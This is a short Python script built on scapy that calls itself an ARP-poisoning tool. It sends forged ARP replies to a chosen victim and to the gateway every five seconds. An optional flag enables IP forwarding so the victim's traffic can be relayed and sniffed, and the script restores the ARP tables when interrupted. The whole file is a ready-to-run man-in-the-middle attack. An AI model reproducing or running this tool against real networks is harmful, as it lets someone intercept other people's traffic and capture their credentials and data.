#!/usr/bin/env python2.7
import os
import sys
from scapy.all import *
import argparse

#Parsing
parser = argparse.ArgumentParser(description='Careful ARP-Poisoning tool')
parser.add_argument('-i','--interface', help='Your interface', required=True)
parser.add_argument('-v','--victim', help='The victim\'s IP', required=True)
parser.add_argument('-r','--router', help='The gateway\'s IP', required=True)
parser.add_argument('-f','--forwarding', help='Enable forwarding to sniff packages', required=False, action="store_true")
args = vars(parser.parse_args())

interface = args['interface']
victimIP = args['victim']
routerIP = args['router']

def getMAC(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src

def Spoof(routerMAC, victimMAC):
    victimMAC = getMAC(victimIP)
    routerMAC = getMAC(routerIP)
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))

def Restore(routerIP, victimIP):
    victimMAC = getMAC(victimIP)
    routerMAC = getMAC(routerIP)
    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4)
    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)

def Main_Loop():
    if args['forwarding'] == True:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while 1:
        try:
            Spoof(routerIP, victimIP)
            time.sleep(5)
        except KeyboardInterrupt:
            Restore(routerIP, victimIP)
            if args['forwarding'] == True:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit(1)

if __name__ == "__main__":
    Main_Loop()
